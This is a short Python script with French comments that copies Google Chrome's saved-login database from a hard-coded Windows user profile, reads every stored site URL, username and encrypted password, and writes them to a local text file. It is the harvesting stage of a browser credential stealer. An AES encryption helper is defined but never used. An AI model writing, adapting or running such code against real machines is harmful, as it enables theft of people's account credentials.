import os
import shutil
import sqlite3
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.primitives.ciphers import algorithms, modes, Cipher
from cryptography.hazmat.backends import default_backend

def encrypt_password(password, key):
    try:
        # Ajout du padding au mot de passe
        padder = padding.PKCS7(algorithms.AES.block_size).padder()
        padded_password = padder.update(password) + padder.finalize()

        # Génération d'un IV aléatoire
        iv = os.urandom(algorithms.AES.block_size)

        # Chiffrement des données
        backend = default_backend()
        cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=backend)
        encryptor = cipher.encryptor()
        ciphertext = encryptor.update(padded_password) + encryptor.finalize()

        # Renvoyer le IV et le texte chiffré
        return iv, ciphertext
    except Exception as e:
        print(e)

def write_encrypted_passwords_to_file(filename, passwords):
    with open(filename, "w") as file:
        for origin_url, username, encrypted_password in passwords:
            file.write(f'URL: {origin_url}\n')
            file.write(f'Username: {username}\n')
            file.write(f'Password: {encrypted_password}\n\n')
            file.write(f'Password hex: {encrypted_password.hex()}\n\n')

password_path = "C:\\Users\\melvi\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data"
temp_password_path = "temp_password"

shutil.copyfile(password_path, temp_password_path)

# Connexion à la base de données SQLite
conn = sqlite3.connect(temp_password_path)
cursor = conn.cursor()

# Exécuter la requête SQL pour récupérer les mots de passe
cursor.execute('SELECT origin_url, username_value, password_value FROM logins')

passwords = []
for row in cursor.fetchall():
    origin_url = row[0]
    username = row[1]
    encrypted_password = row[2]
    passwords.append((origin_url, username, encrypted_password))

conn.close()
os.remove(temp_password_path)

write_encrypted_passwords_to_file("encrypted_passwords.txt", passwords)
